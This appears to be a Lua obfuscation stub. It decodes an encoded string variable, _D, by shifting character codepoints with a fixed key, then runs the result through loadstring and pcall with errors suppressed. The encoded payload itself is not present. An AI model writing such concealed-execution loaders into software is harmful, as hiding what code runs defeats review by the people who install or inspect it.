local _F = function(_S)
    local _K = 3763 - 3168
    local _R = ""
    for _v in _S:gmatch("[%z\1-\127\194-\244][\128-\191]*") do
        _R = _R .. string.char(utf8.codepoint(_v) - 0x2000 - _K)
    end
    return _R
end

local _E = (loadstring or load)(_F(_D))

    pcall(_E)
